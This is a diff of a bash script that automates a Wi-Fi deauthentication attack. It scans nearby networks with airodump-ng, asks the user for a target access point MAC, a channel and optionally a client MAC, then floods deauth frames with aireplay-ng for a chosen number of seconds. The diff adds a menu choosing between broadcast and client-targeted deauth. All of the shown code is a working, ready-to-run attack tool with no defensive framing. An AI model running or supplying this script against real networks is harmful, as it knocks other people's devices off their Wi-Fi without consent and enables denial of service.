@@ -1,5 +1,14 @@
 #!/bin/bash
 
+function userProvided() { #Data user will enter.
+		cat myOutput-01.csv | awk '{ print $1,$6,$19 }' | awk 'NR==1,/Station/' | head -n -1 #printing out results of the scan with the macaddr and channel number
+		echo "Which of the Mac addresses would you like to use?"
+		read macaddr
+		echo "Which channel would you like to use?"
+		read channelNum
+		echo "How long would you like to do the deauth attack? (in seconds)" & read time
+}
+
 function scriptOver() { #just created function so I can just call it. This function resets everything once the intial script is over.
 	echo "Returning everything to normal" 
 	sleep 2
@@ -13,6 +22,7 @@ function scriptOver() { #just created function so I can just call it. This funct
 	ifconfig $interface up
 	echo "Goodbye!" 
        	sleep 3
+	clear
 	exit 0
 }
 
@@ -33,64 +43,40 @@ if [[ `iwconfig|grep $interface` ]] &>/dev/null; then #checking to make sure int
 	airodump-ng $interface -w myOutput --output-format csv & sleep 15
 	kill %1 #killing the previous command.
 	
-	cat myOutput-01.csv | awk '{ print $1,$6,$19 }' | awk 'NR==1,/Station/' | head -n -1 #printing out results of the scan with the macaddr and channel number
 	
-	#airodump-ng -c $channelNum --bssid $macaddr $interface & sleep 15 #now scanning specific channel
-	#pkill -9 airodump-ng #kills the previous command
-	
-	echo "Would you like to attack the network with DEAUTH attack? (y/n)" 
-       	read response		
-	if [ $response = "y" ] || [ $response = "Y" ] ; then 
-		echo "Which of the Mac addresses would you like to use?"
-		read macaddr
-		echo "Which channel would you like to use?"
-		read channelNum
+	echo "1.	Deauth with NO client MAC\n"
+	echo "2.	Deauth WITH client MAC\n"
+	echo "3.	Exit the program\n"
+
+	echo "Pick an Option (1-3)"
+	read response
 		
-		iwconfig $interface channel $channelNum
-		
-		echo "How long would you like to do the deauth attack? (in seconds)" & read time
-		aireplay-ng -0 0 -a $macaddr $interface & sleep $time
-		pkill aireplay-ng
-		scriptOver
-	
-	else
-	
-		echo "Goodbye!"
-		scriptOver
-	fi
+	case $response in 
+
+		1) #if user selected to Deauth with NO client MAC
+			userProvided 
+			aireplay-ng -0 0 -a $macaddr $interface & sleep $time
+			pkill aireplay-ng
+			scriptOver
+			;;
+		2) #if user selected option to Deauth WITH client MAC.
+			userProvided
+			echo "Please provide the Client MAC."
+			read clientMac
+			aireplay-ng -0 0 -a $macaddr -c $clientMac $interface & sleep $time
+			pkill aireplay-ng
+			scriptOver
+			;;
+		3) #if user selected option to leave (option 3)
+			scriptOver
+			;;
+	esac
+
 else
 	echo "This interface does not exsist try again with an actual interface name!"
 	exit 0
 fi
 
 
-
-# This is future stuff I would like to integrate into this script.
-
-
-#echo "Hello Would you like to run this program?"
-#read choice
-#	if [ $choice="y" ] | [ $choice="Y" ]; then 
-#		echo "Ok"
-#		normalRun
-#	else	
-#		echo "Goodbye!"
-#		exit 0
-#	fi
-#	
-##trap ctrl_cINT
-
-#function ctrl_c() { #Reset everything before user exits if ctrl_c is pressed
-#	echo "Ctrl + C happend"
-#	echo "Are you sure you would like to exit? (y/n)"
-#	read response2
-#	if [ $response2="y" ] | [ $response2="Y" ]; then 
-#		echo "Now continuing script"
-#	
-#	else
-#		echo "Reseting everything"
-#		scriptOver
-#		echo "Now Exiting" & echo "Goodbye!"
-#		exit 0
-#	fi
-#}
+#For future
+#Create Ctrl-C escape sequence so user is not left in monitor mode.
